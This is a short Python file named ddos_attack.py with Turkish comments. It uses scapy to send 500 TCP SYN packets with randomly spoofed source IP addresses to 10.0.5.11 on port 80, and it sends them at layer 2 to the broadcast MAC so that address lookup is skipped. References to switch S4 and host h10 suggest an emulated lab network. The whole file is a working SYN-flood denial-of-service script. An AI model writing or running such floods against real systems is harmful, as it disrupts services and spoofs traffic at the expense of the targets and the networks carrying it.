# ddos_attack.py dosyasını bununla güncelle
from scapy.all import *
import time

# MAC adresi aramayı devre dışı bırakıyoruz, direkt hedef MAC'i veriyoruz
# S4'ün h10 tarafındaki kapı MAC'i genelde bellidir ama 'ff:ff:ff:ff:ff:ff' (broadcast) 
# her zaman işe yarar ve uyarıyı susturur.
target_mac = "ff:ff:ff:ff:ff:ff" 

print('Firtina basliyor...')
for i in range(500):
    # Ether katmanını ekleyerek MAC aramasını bypass ediyoruz
    paket = Ether(dst=target_mac) / IP(src=RandIP(), dst='10.0.5.11') / TCP(dport=80, flags='S')
    sendp(paket, verbose=0) # sendp L2 katmanında gönderir
    # sleep'i kaldırıyoruz veya çok düşürüyoruz
    
print('500 paket saniyeler içinde gönderildi!')